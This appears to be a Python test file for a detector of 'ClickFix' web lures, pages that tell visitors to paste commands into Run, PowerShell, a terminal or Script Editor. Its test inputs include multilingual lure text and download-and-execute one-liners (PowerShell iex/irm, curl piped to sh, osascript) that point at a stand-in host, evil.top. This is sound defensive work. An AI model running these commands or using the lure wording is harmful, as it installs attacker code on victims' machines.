from usi.content import clickfix


def test_win_r_instruction_flagged():
    sig = clickfix.check(
        page_text="Verify you are human: Press Win + R, then paste the following command and press Enter.",
        raw_html="<script>navigator.clipboard.writeText('powershell -enc ...')</script>",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_open_run_dialog_instruction_flagged():
    sig = clickfix.check(
        page_text="To continue, open the Run dialog and paste this command to verify you are human.",
        raw_html="",
    )
    assert sig is not None


def test_normal_captcha_page_not_flagged():
    sig = clickfix.check(
        page_text="Please complete the CAPTCHA below by clicking the matching images to continue.",
        raw_html="<div class='g-recaptcha'></div>",
    )
    assert sig is None


def test_captcha_plus_clipboard_js_without_instruction_is_weaker_signal():
    sig = clickfix.check(
        page_text="Verify you are human to continue browsing our site.",
        raw_html="<script>document.execCommand('copy')</script>",
    )
    assert sig is not None
    assert sig.code == "clickfix_possible"


def test_empty_content_not_flagged():
    assert clickfix.check(page_text=None, raw_html=None) is None


def test_normal_page_not_flagged():
    sig = clickfix.check(
        page_text="Welcome to our blog. Today we're discussing quarterly results.",
        raw_html="<p>Welcome to our blog.</p>",
    )
    assert sig is None


def test_spanish_instruction_flagged():
    sig = clickfix.check(
        page_text="Para verificar, presiona Win + R y pega el siguiente comando en la ventana.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_portuguese_instruction_flagged():
    sig = clickfix.check(
        page_text="Pressione Win + R, abra a caixa de dialogo Executar e cole o seguinte comando.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_french_instruction_flagged():
    sig = clickfix.check(
        page_text="Appuyez sur Win + R puis collez la commande suivante pour continuer.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_german_instruction_flagged_native_umlauts():
    sig = clickfix.check(
        page_text="Drücken Sie die Windows-Taste, dann fügen Sie den folgenden Befehl ein.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_german_instruction_flagged_ascii_transliteration():
    # Regression: German ASCII transliteration typically renders ü/ö as
    # "ue"/"oe" (e.g. "drücken" -> "druecken"), not just dropping the
    # umlaut ("drucken") - a single-character regex class missed this
    # entirely on first implementation.
    sig = clickfix.check(
        page_text="Druecken Sie die Windows-Taste, oeffnen Sie den Ausfuehren-Dialog "
                   "und fuegen Sie den folgenden Befehl ein.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_terminalfix_open_powershell_instruction_flagged():
    # "TerminalFix" variant - open PowerShell directly rather than via the
    # Win+R Run dialog, documented in the DPRK fake-meeting job-scam chain.
    # Phrased to avoid also tripping the existing Win+R/"paste this
    # command" patterns, so this actually exercises the new terminal-
    # specific pattern group in isolation.
    sig = clickfix.check(
        page_text="To verify you are human, open PowerShell and run what is shown "
                   "below, then press Enter.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_terminalfix_open_terminal_instruction_flagged():
    sig = clickfix.check(
        page_text="Please open a terminal and run the code shown below to continue.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_literal_powershell_command_syntax_flagged():
    # Per Splunk/Unit42 research, the actual telemetry-bearing content is
    # the literal command itself, shown as copy-paste text on the page.
    sig = clickfix.check(
        page_text="powershell -w hidden -ep bypass -nop -c iex(irm https://evil.top/x.ps1)",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_command_syntax_detected"


def test_curl_pipe_sh_command_syntax_flagged():
    sig = clickfix.check(
        page_text="Copy and run: curl -s https://evil.top/install.sh | sh",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_command_syntax_detected"


def test_downloadstring_command_syntax_flagged():
    sig = clickfix.check(
        page_text="(New-Object Net.WebClient).DownloadString('https://evil.top/p.ps1')",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_command_syntax_detected"


def test_macos_open_script_editor_instruction_flagged():
    # macOS branch (Microsoft's write-up): victims are told to run a file
    # named "Zoom SDK Update.scpt" via Script Editor - the AppleScript
    # equivalent of the Windows PowerShell/terminal instruction.
    sig = clickfix.check(
        page_text="To verify you are human, open Script Editor and run the code "
                   "shown below.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_macos_open_automator_instruction_flagged():
    sig = clickfix.check(
        page_text="Please open Automator and run the workflow shown below to continue.",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_instruction_detected"


def test_osascript_command_syntax_flagged():
    sig = clickfix.check(
        page_text="osascript -e 'do shell script \"curl -s https://evil.top/x.sh | sh\"'",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_command_syntax_detected"


def test_do_shell_script_command_syntax_flagged():
    sig = clickfix.check(
        page_text="do shell script \"curl -fsSL https://evil.top/install.sh -o /tmp/i.sh\"",
        raw_html="",
    )
    assert sig is not None
    assert sig.code == "clickfix_command_syntax_detected"


def test_normal_developer_docs_page_not_flagged():
    # A legitimate page that just talks *about* PowerShell/terminals in
    # prose, without an instruction to open one or literal command
    # syntax, must not be flagged.
    sig = clickfix.check(
        page_text="This tutorial explains how PowerShell scripting works and when "
                   "to use a terminal for automation tasks.",
        raw_html="",
    )
    assert sig is None
